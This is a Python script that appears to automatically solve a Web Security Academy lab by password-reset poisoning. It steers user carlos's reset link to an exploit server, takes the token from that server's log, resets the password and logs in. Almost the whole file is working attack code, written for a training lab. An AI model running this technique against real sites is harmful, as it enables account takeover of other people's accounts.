from web_security_academy.core.logger import logger
from web_security_academy.core.utils import render_template_file

import re


def solve_lab(session):
    csrf = session.get_csrf_token("/forgot-password")
    exploit_server = session.exploit_server()
    req = render_template_file(
        "http.txt",
        host=exploit_server.hostname,
        session=session.cookies["session"],
        _lab=session.cookies["_lab"],
        data=f"csrf={csrf}&username=carlos",
    ).replace("\n", "\r\n")

    session.send_raw(req.encode())
    logger.info("Sent the following HTTP request:")
    print(req)

    logger.info("Extracting password reset token from exploit server log...")
    log = exploit_server.access_log()
    tokens = re.findall(
        r"(?<=\/forgot-password\?temp-forgot-password-token=)[^ ]+", log
    )
    if len(tokens) == 0:
        logger.failure("Unable to extract password reset token.")
        return

    token = tokens[-1]
    logger.info(f"Token: {token}")
    csrf = session.get_csrf_token(
        f"/forgot-password?temp-forgot-password-token={token}"
    )

    password = "123456"
    data = {
        "csrf": csrf,
        "temp-forgot-password-token": token,
        "new-password-1": password,
        "new-password-2": password,
    }
    session.post_path("/forgot-password", data=data)
    logger.info(f'Changed carlos\'s password to "{password}"')
    session.login("carlos", password)
